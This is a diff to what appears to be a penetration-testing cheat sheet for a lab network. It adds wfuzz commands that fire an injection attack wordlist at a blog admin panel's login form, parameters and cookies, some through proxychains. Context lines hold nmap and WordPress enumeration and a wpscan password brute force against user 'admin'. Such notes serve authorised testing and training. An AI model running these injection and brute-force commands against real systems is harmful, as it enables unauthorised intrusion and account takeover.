@@ -32,6 +32,25 @@ nmap -p80 --script http.enum.nse --script-args http-enum.basepath='webservices/'
 
 # CMS Wordpress
 wfuzz -c --hc=404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
+
+==============================================================================
+[+] Fuzzing
+==============================================================================
+
+wfuzz -c -w "/usr/share/wordlists/wfuzz/Injections/All_attack.txt" -d "username=FUZZ&password=FUZZ&signIn=signIn" http:// 172.16.1.12/blog/blogadmin/index.php
+
+wfuzz -c --hc=404 -w "/usr/share/wordlists/wfuzz/Injections/All_attack.txt" http://172.16.1.12/blog/blogadmin/index.php?signIn=FUZZ
+
+proxychains wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/All_attack.txt -u http://172.16.1.12/blog/blogadmin/checkMemberID.php?memberID=FUZZ
+proxychains wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/All_attack.txt -u http://172.16.1.12/blog/blogadmin/blogs_view.php?SelectedID=5 -b columns%2Fblog%2Fblogadmin%2Fblogs_view.php=FUZZ -b columns%2Fblog%2Fblogadmin%2Fblog_categories_view.php=FUZZ -b BLOG_ADMIN=FUZZ
+
+proxychains proxychains wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/All_attack.txt -u http://172.16.1.12/blog/blogadmin/blogs_view.php?SelectedID=FUZZ   
+
+
+
+
+
+
 wpscan --url http://10.10.110.100:65000/wordpress/ --enumerate p,u,t
 wpscan --url http://10.10.110.100:65000/wordpress/ –passwords /usr/share/wordlists/rockyou.txt –usernames admin, james
 
